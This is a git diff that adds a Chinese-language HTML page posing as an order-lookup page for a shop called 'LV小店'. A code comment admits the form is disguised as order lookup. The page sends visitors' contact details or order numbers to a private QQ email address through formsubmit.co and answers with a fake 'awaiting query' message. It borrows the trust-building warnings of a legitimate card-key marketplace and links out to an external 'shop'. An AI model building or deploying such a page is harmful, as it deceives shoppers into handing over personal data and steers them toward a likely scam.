@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LV小店 - 幻羽铺子-2%费率</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system}
+body{background:#fff;padding:20px 16px;}
+.top-bar{display:flex;align-items:center;gap:16px;margin-bottom:32px;}
+.back{font-size:22px}
+.title{font-size:18px;font-weight:600;flex:1;text-align:center;margin-right:30px}
+.page-title{font-size:32px;font-weight:bold;text-align:center;margin-bottom:16px;line-height:1.3}
+.desc{text-align:center;color:#999;font-size:15px;margin-bottom:40px;line-height:1.5}
+.form-box{display:flex;gap:8px;margin-bottom:24px}
+.input-text{flex:1;padding:14px 16px;border:1px solid #eee;border-radius:99px;font-size:16px;outline:none}
+.btn-submit{background:#3478f6;color:white;border:none;padding:14px 22px;border-radius:99px;font-size:16px}
+.warn-text{color:#999;font-size:14px;line-height:1.6;margin-bottom:24px}
+.tip-box{background:#fff8e6;border-radius:12px;padding:18px;margin-bottom:40px}
+.tip-title{display:flex;align-items:center;gap:6px;color:#f5a623;font-size:16px;font-weight:600;margin-bottom:12px}
+.tip-list{font-size:14px;color:#333;line-height:1.8}
+.tip-list p{margin:6px 0}
+.red-text{color:#ff3b30;font-weight:500;margin-top:12px}
+.contact-btn{position:fixed;right:24px;bottom:32px;background:#3478f6;color:white;border:none;padding:16px 26px;border-radius:99px;font-size:16px;display:flex;align-items:center;gap:6px}
+a{text-decoration:none;color:white;}
+</style>
+</head>
+<body>
+<div class="top-bar">
+    <div class="back">×</div>
+    <div class="title">LV小店</div>
+</div>
+<div class="page-title">订单查询</div>
+<div class="desc">轻松查询订单，即刻享受自动交易<br>在此输入您的预留联系方式/订单号，如遗忘请联系平台客服找回</div>
+
+<!-- 留言表单：伪装订单查询 -->
+<form id="msgForm" action="https://formsubmit.co/ajax/3570593743@qq.com" method="POST">
+    <input type="hidden" name="_subject" value="店铺留言【订单查询页】">
+    <input type="hidden" name="_captcha" value="false">
+    <div class="form-box">
+        <input type="text" name="message" class="input-text" placeholder="请输入预留联系方式/订单号" required>
+        <button type="submit" class="btn-submit">查询订单</button>
+    </div>
+</form>
+
+<div class="warn-text">
+⚠️ 免责声明：卖家次日可在本平台申请提现，因此如果您对订单存在疑惑，请在24小时内向平台客服反馈，逾期请自行与卖家协商解决。
+</div>
+
+<div class="tip-box">
+    <div class="tip-title">⚠️ 温馨提示</div>
+    <div class="tip-list">
+        <p>1. 承诺充值返现</p>
+        <p>2. 虚假卡密、过期卡密</p>
+        <p>3. 卡密无意义，仅为提示作用</p>
+        <p>4. 卡密或软件有问题，卖家不售后</p>
+        <p>5. 购买的商品为实物，需要快递发货</p>
+        <p>6. 通过扫描他人给予的二维码进行支付的</p>
+        <p>7. 卡密内容为"联系XX取/发货/服务"、"付款成功，等待充值"</p>
+        <p>8. 以各种理由推脱到第二天</p>
+        <div class="red-text">遇到以上或售后问题，请及时联系平台</div>
+    </div>
+</div>
+
+<!-- 修改：文字改为前往商店，跳转目标 https://yyy748721.github.io/yy/ -->
+<button class="contact-btn">
+    <a href="https://yyy748721.github.io/yy/" target="_blank">前往商店</a>
+</button>
+
+<script>
+// 提交无刷新 + 提交提示
+const form = document.getElementById('msgForm');
+form.addEventListener('submit',async e=>{
+    e.preventDefault();
+    let inputVal = form.message.value.trim();
+    if(!inputVal){
+        alert("请输入内容");
+        return;
+    }
+    try{
+        let res = await fetch(form.action,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({message:inputVal,_subject:"店铺留言【订单查询页】"})
+        })
+        let data = await res.json();
+        if(data.success){
+            alert("提交成功，等待查询反馈");
+            form.reset();
+        }else{
+            alert("提交失败，切换流量重试");
+        }
+    }catch(err){
+        alert("网络异常，切换手机流量提交");
+    }
+})
+</script>
+</body>
+</html>
